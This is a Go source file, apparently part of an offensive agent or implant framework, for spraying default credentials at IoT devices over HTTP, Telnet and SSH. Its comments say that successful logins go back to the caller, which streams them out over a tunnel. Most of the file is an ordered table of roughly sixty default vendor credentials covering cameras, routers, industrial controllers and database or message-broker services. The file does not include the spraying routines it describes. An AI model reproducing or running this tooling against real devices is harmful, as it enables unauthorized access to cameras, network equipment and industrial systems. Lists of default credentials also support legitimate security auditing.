// Package iotcreds implements default-credential spraying against IoT
// devices from the agent. It is the Go analogue of Program/iot/
// default_creds.py and shares the same credential table.
//
// Protocol support:
//   - HTTP/HTTPS basic auth (net/http)
//   - Telnet login prompts (net.Conn + read/write)
//   - SSH password auth (golang.org/x/crypto/ssh)
//
// Hits are returned to the caller; the caller streams them over the tunnel.
package iotcreds

import "fmt"

// Cred is one vendor/user/pass triple.
type Cred struct {
	Vendor string
	User   string
	Pass   string
}

// BuiltinCreds is the default table — matches Program/iot/default_creds.py.
// The order is meaningful: generic creds first (most likely hits), then
// per-vendor by market share, then infrastructure-specific.
var BuiltinCreds = []Cred{
	// generic
	{"generic", "admin", "admin"},
	{"generic", "admin", "password"},
	{"generic", "admin", "1234"},
	{"generic", "admin", "12345"},
	{"generic", "admin", "123456"},
	{"generic", "root", "root"},
	{"generic", "root", "toor"},
	{"generic", "user", "user"},
	{"generic", "guest", "guest"},
	{"generic", "admin", ""},
	{"generic", "root", ""},
	{"generic", "admin", "pass"},
	{"generic", "admin", "admin123"},
	{"generic", "admin", "administrator"},
	{"generic", "support", "support"},

	// cameras / NVR
	{"hikvision", "admin", "12345"},
	{"dahua", "admin", "admin"},
	{"axis", "root", "pass"},
	{"axis", "root", "root"},
	{"foscam", "admin", ""},
	{"foscam", "admin", "admin"},
	{"reolink", "admin", ""},
	{"wyze", "admin", ""},
	{"mobotix", "admin", "meinsm"},
	{"mobotix", "root", "meinsm"},
	{"vivotek", "root", ""},
	{"geutebruck", "admin", "admin"},
	{"honeywell", "admin", "1234"},
	{"sunell", "admin", "admin"},
	{"tenvis", "admin", "admin"},

	// routers / CPE
	{"dlink", "admin", ""},
	{"dlink", "admin", "admin"},
	{"dlink", "root", "root"},
	{"tp-link", "admin", "admin"},
	{"netgear", "admin", "password"},
	{"netgear", "admin", "admin"},
	{"linksys", "admin", "admin"},
	{"linksys", "admin", "password"},
	{"asus", "admin", "admin"},
	{"tenda", "admin", "admin"},
	{"zyxel", "admin", "1234"},
	{"zyxel", "admin", "admin"},
	{"mikrotik", "admin", ""},
	{"mikrotik", "admin", "admin"},
	{"ubiquiti", "ubnt", "ubnt"},
	{"ubiquiti", "admin", "admin"},
	{"cisco", "cisco", "cisco"},
	{"cisco", "admin", "admin"},

	// building / industrial
	{"siemens", "admin", "admin"},
	{"rockwell", "admin", "admin"},
	{"schneider", "USER", "USER"},
	{"scada", "pi", "raspberry"},

	// services / brokers
	{"mqtt", "admin", "admin"},
	{"mqtt", "guest", "guest"},
	{"mqtt", "mosquitto", ""},
	{"redis", "", ""},
	{"redis", "default", ""},
	{"mysql", "root", ""},
	{"mysql", "root", "root"},
	{"postgres", "postgres", "postgres"},
}

// Count returns the size of the built-in table.
func Count() int { return len(BuiltinCreds) }

// Hit records a successful credential guess.
type Hit struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Protocol string `json:"protocol"`
	Vendor   string `json:"vendor"`
	User     string `json:"user"`
	Pass     string `json:"pass"`
	Note     string `json:"note,omitempty"`
}

func (h Hit) String() string {
	pw := h.Pass
	if pw == "" {
		pw = "(empty)"
	}
	return fmt.Sprintf("%s:%d/%s %s/%s/%s",
		h.Host, h.Port, h.Protocol, h.Vendor, h.User, pw)
}
